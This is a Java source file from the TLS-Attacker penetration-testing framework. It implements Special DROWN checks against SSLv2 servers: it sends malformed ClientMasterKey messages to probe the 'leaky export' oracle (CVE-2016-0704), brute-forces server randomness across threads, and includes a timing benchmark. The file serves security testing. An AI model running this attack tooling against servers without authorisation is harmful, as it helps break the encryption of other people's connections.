/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsattacker.attacks.impl.drown;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.util.Modifiable;
import de.rub.nds.tlsattacker.attacks.config.SpecialDrownCommandConfig;
import de.rub.nds.tlsattacker.attacks.constants.DrownVulnerabilityType;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.constants.SSL2CipherSuite;
import de.rub.nds.tlsattacker.core.exceptions.ConfigurationException;
import de.rub.nds.tlsattacker.core.protocol.message.SSL2ClientMasterKeyMessage;
import de.rub.nds.tlsattacker.core.protocol.message.SSL2ServerVerifyMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.state.TlsContext;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import org.apache.commons.lang3.time.DurationFormatUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class SpecialDrownAttacker extends BaseDrownAttacker {

    private static final Logger LOGGER = LogManager.getLogger();

    public SpecialDrownAttacker(SpecialDrownCommandConfig config, Config baseConfig) {
        super(config, baseConfig);
    }

    @Override
    public void executeAttack() {
        SpecialDrownCommandConfig specialConfig = (SpecialDrownCommandConfig) config;

        if (specialConfig.isLeakyExportOracleEnabled()) {
            throw new UnsupportedOperationException("Not implemented yet");
        }

        if (specialConfig.isExtraClearOracleEnabled()) {
            ExtraClearAttack attack = new ExtraClearAttack(getTlsConfig());
            attack.execute(premasterSecrets, specialConfig);
        }
    }

    @Override
    public DrownVulnerabilityType getDrownVulnerabilityType() {
        SpecialDrownCommandConfig specialConfig = (SpecialDrownCommandConfig) config;
        DrownVulnerabilityType vulnerabilityType = DrownVulnerabilityType.UNKNOWN;

        if (specialConfig.isExtraClearOracleEnabled()) {
            ExtraClearAttack attack = new ExtraClearAttack(getTlsConfig());
            return attack.checkForExtraClearOracle();
        }
        if (specialConfig.isLeakyExportOracleEnabled()) {
            String dataFilePath = specialConfig.getCheckDataFilePath();
            if (dataFilePath == null) {
                throw new ConfigurationException("Check data file is required");
            }

            if (!specialConfig.isGenCheckData() && !specialConfig.isAnalyzeCheckData()) {
                throw new ConfigurationException("Specify whether to generate or analyze check data");
            }
            if (specialConfig.isGenCheckData()) {
                vulnerabilityType = genLeakyExportCheckData(dataFilePath);
            }
            if (specialConfig.isAnalyzeCheckData()) {
                vulnerabilityType = checkForLeakyExport(dataFilePath);
            }
        }

        return vulnerabilityType;
    }

    /**
     * Connects to a target host and writes a file to disk which will allow checkForLeakyExport() to check whether the
     * server is affected by the "leaky export" oracle bug (CVE-2016-0704).
     *
     * @param  dataFilePath
     *                      Name of the data dump file for checkForLeakyExport().
     * @return              Information whether the server is vulnerable, if already known
     */
    private DrownVulnerabilityType genLeakyExportCheckData(String dataFilePath) {
        Config tlsConfig = getTlsConfig();
        SSL2CipherSuite cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();

        // Produce correctly-padded SECRET-KEY-DATA of the wrong length (case 2
        // from the DROWN paper)
        int secretKeyLength = cipherSuite.getSecretKeyByteNumber() + 2;
        byte[] secretKey = new byte[secretKeyLength];
        for (int i = 0; i < secretKeyLength; i++) {
            secretKey[i] = (byte) 0xFF;
        }
        ModifiableByteArray secretKeyData = Modifiable.explicit(secretKey);
        SSL2ClientMasterKeyMessage clientMasterKeyMessage = new SSL2ClientMasterKeyMessage();
        // Make sure computations are already in place for the next step
        clientMasterKeyMessage.prepareComputations();
        // The Premaster Secret is SECRET-KEY-DATA for SSLv2
        clientMasterKeyMessage.getComputations().setPremasterSecret(secretKeyData);

        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
            .createWorkflowTrace(WorkflowTraceType.SSL2_HELLO, RunningModeType.CLIENT);
        trace.addTlsAction(new SendAction(clientMasterKeyMessage));
        trace.addTlsAction(new ReceiveAction(new SSL2ServerVerifyMessage()));
        State state = new State(tlsConfig, trace);

        WorkflowExecutor workflowExecutor =
            WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();

        if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SSL2_SERVER_HELLO, trace)) {
            return DrownVulnerabilityType.NONE;
        }

        SSL2ServerVerifyMessage serverVerifyMessage = (SSL2ServerVerifyMessage) WorkflowTraceUtil
            .getFirstReceivedMessage(HandshakeMessageType.SSL2_SERVER_VERIFY, trace);
        CONSOLE.info("Completed server connection");
        LeakyExportCheckData checkData =
            new LeakyExportCheckData(state.getTlsContext(), clientMasterKeyMessage, serverVerifyMessage);

        try {
            FileOutputStream fileStream = new FileOutputStream(dataFilePath);
            ObjectOutputStream objectStream = new ObjectOutputStream(fileStream);
            objectStream.writeObject(checkData);
            objectStream.close();
            fileStream.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        CONSOLE.info("Wrote check data to " + dataFilePath + ", now call analysis");

        return DrownVulnerabilityType.UNKNOWN;
    }

    /**
     * Checks whether the server is affected by the "leaky export" oracle bug (CVE-2016-0704) based on data from
     * genLeakyExportCheckData(). The bug allows to distinguish between an invalid ENCRYPTED-KEY-DATA ciphertext and a
     * valid ciphertext decrypting to a message of the wrong length. This method performs brute-force computations and
     * may take some time to run. It does not connect ot any remote hosts and can run completely offline.
     *
     * @param  dataFilePath
     *                      Name of the data dump file from genLeakyExportCheckData().
     *
     * @return              Indication whether the server is vulnerable to the "leaky export" oracle attack
     */
    private DrownVulnerabilityType checkForLeakyExport(String dataFilePath) {
        LeakyExportCheckData checkData;
        try {
            FileInputStream fileStream = new FileInputStream(dataFilePath);
            ObjectInputStream objectStream = new ObjectInputStream(fileStream);
            checkData = (LeakyExportCheckData) objectStream.readObject();
            objectStream.close();
            fileStream.close();
        } catch (IOException | ClassNotFoundException e) {
            throw new RuntimeException(e);
        }
        CONSOLE.info("Check data read from " + dataFilePath + ", now trying to brute-force server randomness");

        int threadNumber = Runtime.getRuntime().availableProcessors();
        CONSOLE.info("Using " + threadNumber + " threads");
        ExecutorService executor = Executors.newFixedThreadPool(threadNumber);
        int firstBytesPerThread = 256 / threadNumber;

        ArrayList<LeakyExportCheckCallable> allCallables = new ArrayList();
        ArrayList<Future<Boolean>> allResults = new ArrayList();

        for (int i = 0; i < threadNumber; i++) {
            int firstByteFrom = -128 + i * firstBytesPerThread;
            int firstByteTo;
            if (i == threadNumber - 1) {
                firstByteTo = 128;
            } else {
                firstByteTo = firstByteFrom + firstBytesPerThread;
            }

            LeakyExportCheckCallable callable = new LeakyExportCheckCallable(firstByteFrom, firstByteTo, checkData);
            allCallables.add(callable);
            allResults.add(executor.submit(callable));
        }

        executor.shutdown();
        DrownVulnerabilityType vulnerabilityType = DrownVulnerabilityType.SSL2;
        // Count the processed second bytes across all threads to get a quicker
        // and more accurate progress indicator than processing the first bytes
        int processedSecondBytes;

        outer: do {
            processedSecondBytes = 0;
            for (LeakyExportCheckCallable callable : allCallables) {
                processedSecondBytes += callable.getProcessedSecondBytes();
            }

            double processedPortion = (double) processedSecondBytes / (double) (256 * 256);
            String processedPercentage = String.format("%.1f", processedPortion * 100);
            CONSOLE.info("Brute-forced approx. {} % so far", processedPercentage);

            for (Future<Boolean> result : allResults) {
                if (result.isDone()) {
                    CONSOLE.info("A thread has finished");
                    try {
                        if (result.get()) {
                            LOGGER.info("Found server randomness, declaring host vulnerable");
                            vulnerabilityType = DrownVulnerabilityType.SPECIAL;
                            break outer;
                        }
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    } catch (ExecutionException e) {
                        throw new RuntimeException(e);
                    }
                }
            }

            try {
                Thread.sleep(60000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        } while (processedSecondBytes < 256 * 256);

        executor.shutdownNow();

        return vulnerabilityType;
    }

    /**
     * Provides an estimate for how long it would take to do brute-force for Special DROWN with the "leaky export"
     * oracle on the current hardware. MD5 hashing and symmetric encryption are performed, as required for "leaky
     * export". This was originally implemented to get a feeling for the numbers during development, but might also be
     * useful in other situations.
     */
    private void leakyExportBenchmark() {
        long startTime = System.currentTimeMillis();
        Config tlsConfig = getTlsConfig();
        SSL2CipherSuite cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();
        State state = new State(tlsConfig);
        TlsContext context = state.getTlsContext();

        byte[] encrypted = new byte[40];
        context.getRandom().nextBytes(encrypted);
        byte[] iv = new byte[cipherSuite.getBlockSize()];
        byte[] challenge = new byte[16];
        context.getRandom().nextBytes(challenge);
        byte[] sessionId = context.getChooser().getServerSessionId();
        byte[] baseMasterKey = new byte[cipherSuite.getClearKeyByteNumber() + cipherSuite.getSecretKeyByteNumber()];
        context.getRandom().nextBytes(baseMasterKey);

        int threadNumber = Runtime.getRuntime().availableProcessors();
        CONSOLE.info("Using " + threadNumber + " threads");
        ExecutorService executor = Executors.newFixedThreadPool(threadNumber);
        int firstBytesPerThread = 256 / threadNumber;

        for (int i = 0; i < threadNumber; i++) {
            int firstByteFrom = -128 + i * firstBytesPerThread;
            int firstByteTo;
            if (i == threadNumber - 1) {
                firstByteTo = 128;
            } else {
                firstByteTo = firstByteFrom + firstBytesPerThread;
            }

            LeakyExportBenchmarkRunnable runnable =
                new LeakyExportBenchmarkRunnable(cipherSuite, firstByteFrom, firstByteTo);
            runnable.init(encrypted, baseMasterKey, challenge, sessionId, iv);
            executor.execute(runnable);
        }

        executor.shutdown();
        try {
            if (!executor.awaitTermination(60, TimeUnit.MINUTES)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
            e.printStackTrace();
        }

        long durationMillis = System.currentTimeMillis() - startTime;
        int durationSecs = (int) durationMillis / 1000;
        CONSOLE.info("Time for brute-forcing 3 bytes: " + durationSecs + " seconds");
        long completeMills = durationMillis * 256 * 256;
        String completeStr = DurationFormatUtils.formatDuration(completeMills, "d 'days', H 'hours', m 'minutes'");
        CONSOLE.info("Estimated time to completely brute-force 5 bytes: " + completeStr);
        long expectedMillis = completeMills / 2;
        String expectedStr = DurationFormatUtils.formatDuration(expectedMillis, "d 'days', H 'hours', m 'minutes'");
        CONSOLE.info("Estimated average time spent brute-forcing 5 bytes: " + expectedStr);
    }
}
